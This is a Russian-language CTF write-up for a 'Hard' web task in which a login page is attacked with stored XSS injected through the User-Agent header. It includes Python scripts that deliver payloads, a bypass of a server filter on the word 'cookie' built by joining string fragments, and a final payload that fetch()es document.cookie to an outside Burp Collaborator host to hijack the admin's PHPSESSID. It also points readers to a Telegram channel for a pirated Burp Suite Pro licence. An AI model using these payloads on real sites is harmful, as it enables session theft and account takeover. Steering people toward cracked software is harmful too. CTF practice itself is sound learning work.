
# 666
**level**: **Hard**
**Description**: Воображение важнее, чем знания
**IP**: 62.173.140.174:16035
Первое что мы видим - форма логин/регистрации, для этого нужно получить доступ к аккаунту админа.
Изучаем html код на наличие подсказок, скрытых функций и тд.
<!-- Send Post request with parameter newpassword .... -->
Отлично, какой-то скрытый функционал, позже мы к нему вернемся.
Исследуем далее.

Попробуем XSS payload:
````javascript 
<script>alert(1)</script>
Но изменить имя admin на пейлоад нельзя, но не будем забывать что есть еще другие поля, которые тоже скорее всего подвержены XSS-атаке.
На поле id, username, IP, Date мы повлиять не можем, они генерируются на сервере, а вот на User-Agent запросто!
Для этого напишем скрипт на python, он нам очень пригодится в будущем.
# Проведение атаки
````python 
import requests

payload = "<script>alert(1);</script>" # это пейлоад

user = "asdf" #Тут наш username
headers = {'User-Agent': payload} # Вставляем его в хедер
data = {"username":user, "password":"aboba"}

response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data) # Совершаем попытку логина с неверным паролем
 
print(response.status_code)# Выводим информацию
#print(response.text) 
````

У нас получилось внедрить свой код.
### Возможные пути кражи аккаунта через XSS:

1. **Кража cookies**
    
2. **Phishing**
   
4. **Манипуляции с DOM**
    
5. **Кража токенов аутентификации**

# способ 
Для данного способа вам потребуется ```Burp Suite Pro```. Почему именно PRO?
Потому, что там есть ```Collaborator```, которого нет в бесплатной версии. 
Переходим по ссылке ``` https://t.me/pt_soft``` чтобы "КУПИТЬ" нашу лицензию.
В поиске по каналу в телеге ищем **Burpsuite**. И устанавливаем.

## Атака

После поиска в гугл по запросу "XSS steal cookie payloads" и изучения результатов понимаем что нам нужно захватить ```document.cookie``` **значение**.

Пробуем alert();

````python 
import requests

payload = '<script>alert(document.cookie);</script>'
user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}

response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````
И сталкиваемся с проблемой
Все сработало, но вот alert'a нет, потому что на Codeby.games есть похожий таск, и автор данного решил чтобы все было не так просто, применить фильтрацию на серверной части на слово ```cookie```.
Мы это тоже обойдем, нужно просто немного **подумать**.
## Обход фильтрации
Попбробуем обойти фильтрацию с помощью cookie
````javascript
const vv = ["coo", "kie"].join(""); # передаем его раздельно и с помощью join собираем в одно слово
alert(document[vv]); # не забываем что document это обьект, и к его значениям можно обращаться не только через точку, но и через [значение]
````
Пробуем этот payload.
````python 
import requests

payload = '<script>const vv = ["coo", "kie"].join("");alert(document[vv]);</script>'

user = "asdf" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}

response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
print(response.text)
````

Вспоминаем зачем нам потребовался коллаборатор в бурпе.
Данное значение, которое только вывели в alert, мы будем ловить на его **сервер**.

Для понимания как это работает.

1) Переходим в вкладку
2) Копируем **url**
3) Переходим по ней в google
4) Нажимаем **Poll now**, чтобы получить с сервера данные.
5) Если окошко как на фото снизу не появляется, то нажмите на "+. Это создаст новую сессию и обновит окошко.

Мы только что поймали наш request и можем его детально рассмотреть.
Эта функция заменит нам ngrok или свой белый IP и сервер.

````python 
import requests
payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://{{СЮДА}}/?${vv}=` + document[vv]; fetch(payload);</script>'

user = "admin" 
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}
response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
print(response.status_code)
print(response.text)
````
Отправляем, ждем, пуллим.
Подставим значение PHPSESSID в наш браузер. 
